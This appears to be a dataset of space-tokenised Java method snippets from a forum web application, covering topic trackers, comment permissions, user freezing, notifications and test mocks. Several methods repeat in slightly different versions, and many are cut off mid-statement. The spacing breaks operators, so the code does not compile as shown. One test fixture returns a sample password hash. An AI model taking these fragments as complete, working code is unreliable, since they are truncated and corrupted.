public static ResultSet getUserFrozen ( ) throws Exception { ResultSet resultSet = mock ( ResultSet . class ) ; when ( resultSet . getInt ( " id " ) ) . thenReturn ( 1599 ) ; when ( resultSet . getString ( " nick " ) ) . thenReturn ( " frozen " ) ; when ( resultSet . getString ( " style " ) ) . thenReturn ( " tango " ) ; when ( resultSet . getBoolean ( " canmod " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " candel " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " corrector " ) ) . thenReturn ( false ) ; when ( resultSet . getBoolean ( " activated " ) ) . thenReturn ( true ) ; when ( resultSet . getBoolean ( " blocked " ) ) . thenReturn ( false ) ; when ( resultSet . getInt ( " score " ) ) . thenReturn ( 110 ) ; when ( resultSet . getInt ( " max_score " ) ) . thenReturn ( 110 ) ; when ( resultSet . getString ( " name " ) ) . thenReturn ( " Frozen " ) ; when ( resultSet . getString ( " passwd " ) ) . thenReturn ( " S+Q/c5dtkvNxO42uEcQBdP8r32zOfdUq " ) ; when ( resultSet . getString ( " photo " ) ) . thenReturn ( null ) ; when ( resultSet . getString ( " email " ) ) . thenReturn ( null ) ; when ( resultSet . getInt ( " unread_events " ) ) . thenReturn ( 15 ) ; Timestamp future = new Timestamp ( System . currentTimeMillis ( ) + 1000 ) ; when ( resultSet . getTimestamp ( " frozen_until " ) ) . thenReturn ( future ) ; when ( resultSet . getInt ( " frozen_by " ) ) . thenReturn ( 1 ) ; when ( resultSet . getString ( " freezing_reason " ) ) . thenReturn ( " just because " ) ; return resultSet ; } 
public ModelAndView showEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid ) throws Exception { Topic message = messageDao . getById ( msgid ) ; Template tmpl = Template . getTemplate ( request ) ; Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; topicPermissionService . checkView ( group , message , tmpl . getCurrentUser ( ) , false ) ; PreparedTopic preparedMessage = topicPrepareService . prepareTopic ( message , tmpl . getCurrentUser ( ) ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( message ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; modelAndView . getModel ( ) . put ( " canRestore " , groupPermissionService . isEditable ( preparedMessage , tmpl . getCurrentUser ( ) ) ) ; return modelAndView ; } 
public ModelAndView showCommentEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid , @PathVariable ( " commentid " ) int commentId ) throws Exception { Topic message = messageDao . getById ( msgid ) ; Comment comment = commentService . getById ( commentId ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( comment ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; modelAndView . getModel ( ) . put ( " canRestore " , false ) ; return modelAndView ; } 
public List < TopicsListItem > getGroupTrackerTopics ( int groupid , User currentUser , Date startDate , int topics , int offset , final int messagesInPage ) { return load ( " AND t.groupid = " + groupid + " " , " " , currentUser , startDate , topics , offset , messagesInPage ) ; } 
public List < TopicsListItem > getTrackerTopics ( TrackerFilterEnum filter , User currentUser , Date startDate , int topics , int offset , final int messagesInPage ) { String partFilter ; switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case MAIN : partFilter = queryPartMain ; break ; case TECH : partFilter = queryPartTech ; break ; default : partFilter = " " ; } String userFilter ; switch ( filter ) { case SCORE50 : userFilter = " AND userid IN (SELECT id FROM users WHERE score<50) " ; break ; case SCORE100 : userFilter = " AND userid IN (SELECT id FROM users WHERE score<100) " ; break ; default : userFilter = " " ; } return load ( partFilter , userFilter , currentUser , startDate , topics , offset , messagesInPage ) ; } 
public boolean isModeratorOnly ( ) { return moderatorOnly ; } 
public static String cleanupIp ( @Nullable String ip ) { if ( ip ! = null ) { if ( ! ipRE . matcher ( ip ) . matches ( ) ) { throw new BadInputException ( " not ip " ) ; } } return ip ; } 
public List < TopicsListItem > getGroupTrackerTopics ( int groupid , User currentUser , int topics , int offset , int messagesInPage ) { return load ( " AND t.groupid = " + groupid + " " , " " , currentUser , topics , offset , messagesInPage , " comment_postdate " , 
public List < TopicsListItem > getGroupListTopics ( int groupid , User currentUser , int topics , int offset , int messagesInPage , boolean showIgnored , boolean showDeleted , Integer year , Integer month ) { String commentInterval ; if ( year ! = null ) { commentInterval = " AND t.postdate>=' " + year + '-' + month + " -01'::timestamp AND (t.postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } else if ( offset = = 0 & & ! showDeleted ) { commentInterval = " AND t.postdate>CURRENT_TIMESTAMP-'3 month'::interval " ; } else { commentInterval = " " ; } return load ( " AND t.groupid = " + groupid + " AND NOT t.sticky " , " " , currentUser , topics , offset , messagesInPage , 
public List < TopicsListItem > getGroupStickyTopics ( Group group , int messagesInPage ) { return load ( " AND t.groupid = " + group . getId ( ) + " AND t.sticky " , " " , null , 100 , 0 , messagesInPage , 
public List < TopicsListItem > getTrackerTopics ( TrackerFilterEnum filter , User currentUser , int topics , int offset , int messagesInPage ) { String partFilter ; switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case MAIN : partFilter = queryPartMain ; break ; case TECH : partFilter = queryPartTech ; break ; default : partFilter = " " ; } String userFilter ; switch ( filter ) { case SCORE50 : userFilter = " AND userid IN (SELECT id FROM users WHERE score<50) " ; break ; case SCORE100 : userFilter = " AND userid IN (SELECT id FROM users WHERE score<100) " ; break ; default : userFilter = " " ; } return load ( partFilter , userFilter , currentUser , topics , offset , messagesInPage , " comment_postdate " , " AND comments.postdate > CURRENT_TIMESTAMP-'4 days'::interval " , 
public List < TopicsListItem > getGroupTrackerTopics ( int groupid , User currentUser , int topics , int offset , int messagesInPage ) { String dateFilter = " >CURRENT_TIMESTAMP-'3 month'::interval " ; return load ( " AND t.groupid = " + groupid + " " , " " , currentUser , topics , offset , messagesInPage , " comment_postdate " , 
public List < TopicsListItem > getTrackerTopics ( TrackerFilterEnum filter , User currentUser , int topics , int offset , int messagesInPage ) { String partFilter ; switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case MAIN : partFilter = queryPartMain ; break ; case TECH : partFilter = queryPartTech ; break ; default : partFilter = " " ; } String userFilter ; switch ( filter ) { case SCORE50 : userFilter = " AND userid IN (SELECT id FROM users WHERE score<50) " ; break ; case SCORE100 : userFilter = " AND userid IN (SELECT id FROM users WHERE score<100) " ; break ; default : userFilter = " " ; } String dateFilter = " >CURRENT_TIMESTAMP-'4 days'::interval " ; return load ( partFilter , userFilter , currentUser , topics , offset , messagesInPage , " comment_postdate " , " AND comments.postdate " + dateFilter + " AND t.lastmod " + dateFilter , 
public List < TopicsListItem > getGroupListTopics ( int groupid , User currentUser , int topics , int offset , int messagesInPage , boolean showIgnored , boolean showDeleted , Integer year , Integer month ) { String commentInterval ; if ( year ! = null ) { commentInterval = " AND t.postdate>=' " + year + '-' + month + " -01'::timestamp AND (t.postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } else { commentInterval = " AND t.postdate>CURRENT_TIMESTAMP-'3 month'::interval " ; } return load ( " AND t.groupid = " + groupid + " AND NOT t.sticky " , " " , currentUser , topics , offset , messagesInPage , 
public void deleteInactivated ( ) { jdbcTemplate . update ( " delete from user_events where userid in (select id from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'3 days'::interval) " ) ; jdbcTemplate . update ( " delete from topic_users_notified where userid in (select id from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'3 days'::interval) " ) ; jdbcTemplate . update ( " delete from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'3 days'::interval " ) ; jdbcTemplate . update ( " delete from ban_info where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'90 days'::interval) " ) ; jdbcTemplate . update ( " delete from user_events where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'90 days'::interval) " ) ; jdbcTemplate . update ( " delete from topic_users_notified where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'90 days'::interval) " ) ; jdbcTemplate . update ( " delete from users where not activated and regdate<CURRENT_TIMESTAMP-'90 days'::interval " ) ; } 
public int countUnactivated ( String ip ) { return jdbcTemplate . queryForObject ( " select count(*) from users join user_log on users.id = user_log.userid " + 
public void deleteInactivated ( ) { logger . info ( " Deleting non-activated accounts " ) ; jdbcTemplate . update ( " delete from user_events where userid in (select id from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'3 days'::interval) " ) ; jdbcTemplate . update ( " delete from topic_users_notified where userid in (select id from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'3 days'::interval) " ) ; int deleted = jdbcTemplate . update ( " delete from users where not activated and not blocked and regdate<CURRENT_TIMESTAMP-'3 days'::interval " ) ; jdbcTemplate . update ( " delete from ban_info where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'90 days'::interval) " ) ; jdbcTemplate . update ( " delete from user_events where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'90 days'::interval) " ) ; jdbcTemplate . update ( " delete from topic_users_notified where userid in (select id from users where not activated and regdate<CURRENT_TIMESTAMP-'90 days'::interval) " ) ; int deletedBlocked = jdbcTemplate . update ( " delete from users where not activated and regdate<CURRENT_TIMESTAMP-'90 days'::interval " ) ; logger . info ( " Deleted {} non-activated; {} blocked accounts " , deleted , deletedBlocked ) ; } 
public CommentDao commentDao ( DataSource dataSource ) { return new CommentDao ( dataSource ) ; } 
public List < PreparedCommentsListItem > prepareCommentsList ( List < CommentsListItem > comments ) { Map < Integer , User > users = loadUsers ( Iterables . transform ( comments , CommentsListItem : : getAuthorId ) ) ; return comments . stream ( ) . map ( comment - > { User author = users . get ( comment . authorId ( ) ) ; 
public List < PreparedCommentsListItem > prepareCommentsList ( List < CommentsListItem > comments ) { Map < Integer , User > users = loadUsers ( Iterables . transform ( comments , CommentsListItem : : getAuthorId ) ) ; Map < Integer , MessageText > texts = msgbaseDao . getMessageText ( Lists . transform ( comments , CommentsListItem : : getCommentId ) ) ; return comments . stream ( ) . map ( comment - > { User author = users . get ( comment . authorId ( ) ) ; 
private boolean hasMask ( String ip ) { return ip . contains ( " / " ) ; } 
public ModelAndView showForm ( ) throws AccessViolationException { AuthUtil . getCurrentUser ( ) . checkFrozen ( ) ; return new ModelAndView ( " addphoto " ) ; } 
public ModelAndView showForm ( ServletRequest request ) throws AccessViolationException { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } tmpl . getCurrentUser ( ) . checkFrozen ( ) ; return new ModelAndView ( " addphoto " ) ; } 
public boolean isCommentsAllowed ( Group group , Topic topic , User user ) { if ( user ! = null & & ( user . isBlocked ( ) | | user . isFrozen ( ) ) ) { return false ; } if ( topic . isDeleted ( ) | | topic . isExpired ( ) | | topic . isDraft ( ) ) { return false ; } int score = getPostscore ( group , topic ) ; if ( score = = POSTSCORE_NO_COMMENTS ) { return false ; } if ( score = = POSTSCORE_UNRESTRICTED ) { return true ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . isModerator ( ) ) { return true ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return true ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = topic . getUid ( ) ; if ( score = = POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return true ; 
public boolean isCommentsAllowed ( Group group , Topic topic , User user ) { if ( user ! = null & & ( user . isBlocked ( ) | | user . isFrozen ( ) ) ) { return false ; } if ( topic . isDeleted ( ) | | topic . isExpired ( ) | | topic . isDraft ( ) ) { return false ; } int score = getPostscore ( group , topic ) ; if ( score = = POSTSCORE_NO_COMMENTS | | score = = POSTSCORE_HIDE_COMMENTS ) { return false ; } if ( score = = POSTSCORE_UNRESTRICTED ) { return true ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . isModerator ( ) ) { return true ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return true ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = topic . getUid ( ) ; if ( score = = POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return true ; 
public boolean isCommentsClosed ( ) { return commentsClosed ; } 
public boolean isCommentsClosed ( ) { return topicPostscore > = TopicPermissionService . POSTSCORE_MODERATORS_ONLY ; } 
public boolean isShowComments ( ) { return showComments ; } 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , Profile profile , boolean loadUserpics ) { boolean topicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean tagsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; boolean deletable ; boolean undeletable ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; undeletable = groupPermissionService . isUndeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; deletable = false ; undeletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profile . isShowPhotos ( ) ) { userpic = userService . getUserpic ( message . getAuthor ( ) , profile . getAvatarMode ( ) , true ) ; } int postscore = topicPermissionService . getPostscore ( message . getGroup ( ) , message . getMessage ( ) ) ; boolean showComments = postscore ! = TopicPermissionService . POSTSCORE_HIDE_COMMENTS ; return new TopicMenu ( topicEditable , 
public UserTagDao userTagDao ( DataSource ds ) { return new UserTagDao ( ds ) ; } 
public void initTest ( ) throws Exception { UserService userService = mock ( UserService . class ) ; User splinter = mock ( User . class ) ; maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . thenReturn ( false ) ; when ( JB . isBlocked ( ) ) . thenReturn ( false ) ; when ( isden . isBlocked ( ) ) . thenReturn ( true ) ; when ( maxcom . getNick ( ) ) . thenReturn ( " maxcom " ) ; when ( JB . getNick ( ) ) . thenReturn ( " JB " ) ; when ( isden . getNick ( ) ) . thenReturn ( " isden " ) ; when ( splinter . isBlocked ( ) ) . thenReturn ( false ) ; when ( splinter . getNick ( ) ) . thenReturn ( " splinter " ) ; when ( userService . getUserCached ( " splinter " ) ) . thenReturn ( splinter ) ; when ( userService . getUserCached ( " maxcom " ) ) . thenReturn ( maxcom ) ; when ( userService . getUserCached ( " JB " ) ) . thenReturn ( JB ) ; when ( userService . getUserCached ( " isden " ) ) . thenReturn ( isden ) ; when ( userService . getUserCached ( " hizel " ) ) . thenThrow ( new UserNotFoundException ( " hizel " ) ) ; String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( siteConfig . getSecureURI ( ) ) . thenReturn ( mainURI ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( userService , toHtmlFormatter ) ; } 
public void init ( ) { lorCodeService = new LorCodeService ( null , null ) ; } 
public void init ( ) throws Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( mock ( UserService . class ) , toHtmlFormatter ) ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void initTest ( ) throws Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( mock ( UserService . class ) , toHtmlFormatter ) ; } 
public ModelAndView getMessageNewPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) throws Exception { Section section = sectionService . getSectionByName ( sectionName ) ; return getMessage ( section , webRequest , request , response , page , filter , groupName , msgid , 0 ) ; } 
public ModelAndView getMessageThread ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " skipdeleted " , required = false , defaultValue = " false " ) boolean skipDeleted , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " threadRoot " ) int threadRoot ) throws Exception { Section section = sectionService . getSectionByName ( sectionName ) ; return getMessage ( section , webRequest , request , response , 0 , filter , groupName , msgid , threadRoot ) ; } 
public ModelAndView showEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid ) throws Exception { Topic message = messageDao . getById ( msgid ) ; Template tmpl = Template . getTemplate ( request ) ; Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; PreparedTopic preparedMessage = topicPrepareService . prepareTopic ( message , tmpl . getCurrentUser ( ) ) ; topicPermissionService . checkView ( group , message , tmpl . getCurrentUser ( ) , preparedMessage . getAuthor ( ) , false ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( message ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; modelAndView . getModel ( ) . put ( " canRestore " , groupPermissionService . isEditable ( preparedMessage , tmpl . getCurrentUser ( ) ) ) ; return modelAndView ; } 
public boolean isCommentsAllowed ( Group group , Topic topic , User user ) { if ( user ! = null & & ( user . isBlocked ( ) | | user . isFrozen ( ) ) ) { return false ; } if ( topic . isDeleted ( ) | | topic . isExpired ( ) | | topic . isDraft ( ) ) { return false ; } int score = getPostscore ( group , topic ) ; if ( score = = POSTSCORE_NO_COMMENTS | | score = = POSTSCORE_HIDE_COMMENTS ) { return false ; } if ( score = = POSTSCORE_UNRESTRICTED ) { return true ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . isModerator ( ) ) { return true ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return true ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = topic . getAuthorUserId ( ) ; if ( score = = POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return true ; 
public void test1 ( ) { User maxcom = userDao . getUser ( 1 ) ; assertTrue ( memoriesDao . getWatchCountForUser ( maxcom ) > 0 ) ; assertTrue ( memoriesDao . isWatchPresetForUser ( maxcom ) ) ; User anonymous = userDao . getUser ( 2 ) ; assertEquals ( 0 , memoriesDao . getWatchCountForUser ( anonymous ) ) ; assertFalse ( memoriesDao . isFavPresetForUser ( anonymous ) ) ; } 
public boolean isIncludeAnonymous ( ) { return includeAnonymous ; } 
public boolean isTopicSearchable ( Topic msg , Group group ) { Preconditions . checkArgument ( msg . getGroupId ( ) = = group . getId ( ) ) ; return ! msg . isDeleted ( ) & & ! msg . isDraft ( ) 
private ModelAndView createNewTopic ( HttpServletRequest request , AddTopicRequest form , HttpSession session , Group group , Map < String , Object > params , Section section , User user , MessageText message , UploadedImagePreview scrn , Topic previewMsg ) throws Exception { session . removeAttribute ( " image " ) ; int msgid = topicService . addMessage ( request , form , message , group , user , scrn , previewMsg ) ; if ( ! previewMsg . isDraft ( ) ) { searchQueueSender . updateMessageOnly ( msgid ) ; } String messageUrl = " view-message.jsp?msgid= " + msgid ; if ( ! section . isPremoderated ( ) | | previewMsg . isDraft ( ) ) { return new ModelAndView ( new RedirectView ( messageUrl ) ) ; 
public List < Topic > getTopicsFeed ( Section section , Group group , String tag , Integer offset , Integer year , Integer month , int count , @Nullable User currentUser ) throws TagNotFoundException { logger . debug ( " TopicListService.getTopicsFeed() " + " ; section= " + ( ( section ! = null ) ? section . toString ( ) : " (null) " ) + " ; group= " + ( ( group ! = null ) ? group . toString ( ) : " (null) " ) + " ; tag= " + tag + " ; offset= " + offset + " ; year= " + year + " ; month= " + month ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } if ( tag ! = null ) { topicListDto . setTag ( tagService . getTagId ( tag , false ) ) ; } if ( month ! = null & & year ! = null ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; topicListDto . setToDate ( calendar . getTime ( ) ) ; } else { topicListDto . setLimit ( count ) ; topicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( tag = = null & & group = = null & & ! section . isPremoderated ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return topicListDao . getTopics ( topicListDto , currentUser ) ; } 
public void resetMockObjects ( ) throws Exception { reset ( userTagDao ) ; reset ( tagService ) ; when ( tagService . getTagId ( eq ( " tag1 " ) , anyBoolean ( ) ) ) . thenReturn ( 2 ) ; user = getUser ( 1 ) ; } 
public boolean matches ( CharSequence rawPassword , String encodedPassword ) { if ( rawPassword . length ( ) ! = 0 ) { try { 
public int deleteUnusedTags ( ) { return jdbcTemplate . getJdbcTemplate ( ) . update ( " delete from user_tags where not exists " + " (select * from tags join topics on topics.id=tags.msgid where tagid=user_tags.tag_id and not deleted) " ) ; 
public List < Topic > getTopicsFeed ( Section section , Group group , String tag , Integer offset , Integer year , Integer month , int count , @Nullable User currentUser ) throws TagNotFoundException { logger . debug ( " TopicListService.getTopicsFeed() " + " ; section= " + ( ( section ! = null ) ? section . toString ( ) : " (null) " ) + " ; group= " + ( ( group ! = null ) ? group . toString ( ) : " (null) " ) + " ; tag= " + tag + " ; offset= " + offset + " ; year= " + year + " ; month= " + month ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } if ( tag ! = null ) { topicListDto . setTag ( tagService . getTagId ( tag , false ) ) ; } if ( month ! = null & & year ! = null ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; topicListDto . setToDate ( calendar . getTime ( ) ) ; } else { topicListDto . setLimit ( count ) ; topicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( tag = = null & & group = = null & & ! section . isPremoderated ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return topicListDao . getTopics ( topicListDto , currentUser ) ; } 
public List < Topic > getRssTopicsFeed ( Section section , Group group , Date fromDate , boolean noTalks , boolean tech ) { logger . debug ( " TopicListService.getRssTopicsFeed() " + " ; section= " + ( ( section ! = null ) ? section . toString ( ) : " (null) " ) + " ; group= " + ( ( group ! = null ) ? group . toString ( ) : " (null) " ) + " ; fromDate= " + fromDate + " ; noTalks= " + noTalks + " ; tech= " + tech ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } topicListDto . setDateLimitType ( TopicListDto . DateLimitType . FROM_DATE ) ; topicListDto . setFromDate ( fromDate ) ; topicListDto . setNotalks ( noTalks ) ; topicListDto . setTech ( tech ) ; topicListDto . setLimit ( 100 ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } return topicListDao . getTopics ( topicListDto , null ) ; } 
public Set < Integer > makeHideSet ( CommentList comments , int filterChain , @Nonnull Set < Integer > ignoreList ) throws UserNotFoundException { if ( filterChain = = CommentFilter . FILTER_NONE ) { return ImmutableSet . of ( ) ; } Set < Integer > hideSet = new HashSet < > ( ) ; if ( ( filterChain & CommentFilter . FILTER_IGNORED ) > 0 ) { if ( ! ignoreList . isEmpty ( ) ) { comments . getRoot ( ) . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
private void notifyMentions ( User author , Comment comment , MessageText commentBody , int commentId ) { Set < User > userRefs = textService . mentions ( commentBody ) ; userRefs = userRefs . stream ( ) . filter ( p - > ! userService . isIgnoring ( p . getId ( ) , author . getId ( ) ) ) . collect ( Collectors . toSet ( ) ) ; userEventService . addUserRefEvent ( userRefs , comment . getTopicId ( ) , commentId ) ; } 
public void insertCommentWatchNotification ( Comment comment , Optional < Comment > parentComment , int commentId ) { Map < String , Integer > params = new HashMap < > ( ) ; params . put ( " topic " , comment . getTopicId ( ) ) ; params . put ( " id " , commentId ) ; params . put ( " userid " , comment . getUserid ( ) ) ; if ( parentComment . isPresent ( ) ) { params . put ( " parent_author " , parentComment . get ( ) . getUserid ( ) ) ; 
public void addReplyEvent ( User parentAuthor , int topicId , int commentId ) { userEventDao . addEvent ( ANSWERS . getType ( ) , 
public void insertCommentWatchNotification ( Comment comment , Optional < Comment > parentComment , int commentId ) { userEventDao . insertCommentWatchNotification ( comment , parentComment , commentId ) ; } 
public UserEventDao userEventDao ( DataSource ds ) { return new UserEventDao ( ds ) ; } 
private Set < User > notifyMentions ( User author , Comment comment , MessageText commentBody , int commentId ) { Set < User > userRefs = textService . mentions ( commentBody ) ; userRefs = userRefs . stream ( ) . filter ( p - > ! userService . isIgnoring ( p . getId ( ) , author . getId ( ) ) ) . collect ( Collectors . toSet ( ) ) ; userEventService . addUserRefEvent ( userRefs , comment . getTopicId ( ) , commentId ) ; return userRefs ; } 
public List < Integer > insertCommentWatchNotification ( Comment comment , Optional < Comment > parentComment , int commentId ) { return userEventDao . insertCommentWatchNotification ( comment , parentComment , commentId ) ; } 
private ModelAndView createNewTopic ( HttpServletRequest request , AddTopicRequest form , HttpSession session , Group group , Map < String , Object > params , Section section , User user , MessageText message , UploadedImagePreview scrn , Topic previewMsg ) throws Exception { session . removeAttribute ( " image " ) ; Tuple2 < Integer , Set < Integer > > result = topicService . addMessage ( request , form , message , group , user , scrn , previewMsg ) ; int msgid = result . _1 ; if ( ! previewMsg . isDraft ( ) ) { searchQueueSender . updateMessageOnly ( msgid ) ; RealtimeEventHub . notifyEvents ( realtimeHubWS , result . _2 ) ; } String messageUrl = " view-message.jsp?msgid= " + msgid ; if ( ! section . isPremoderated ( ) | | previewMsg . isDraft ( ) ) { return new ModelAndView ( new RedirectView ( messageUrl ) ) ; 
public String resetNotifications ( HttpServletRequest request , @RequestParam int topId ) { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " not authorized " ) ; } User currentUser = tmpl . getCurrentUser ( ) ; userEventService . resetUnreadReplies ( currentUser , topId ) ; RealtimeEventHub . notifyEvents ( realtimeHubWS , ImmutableList . of ( currentUser . getId ( ) ) ) ; return " ok " ; } 
public List < Integer > processCommentsDeleted ( List < Integer > msgids ) { List < Integer > users = userEventDao . deleteCommentEvents ( msgids ) ; userEventDao . recalcEventCount ( users ) ; return users ; } 
public int createUser ( String name , String nick , String password , String url , InternetAddress mail , String town , String ip ) { PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; int userid = jdbcTemplate . queryForObject ( " select nextval('s_uid') as userid " , Integer . class ) ; jdbcTemplate . update ( " INSERT INTO users " + " (id, name, nick, passwd, url, email, town, score, max_score,regdate) " + " VALUES (?,?,?,?,?,?,?,45,45,current_timestamp) " , userid , name , nick , encryptor . encryptPassword ( password ) , url = = null ? null : URLUtil . fixURL ( url ) , mail . getAddress ( ) , town ) ; return userid ; } 
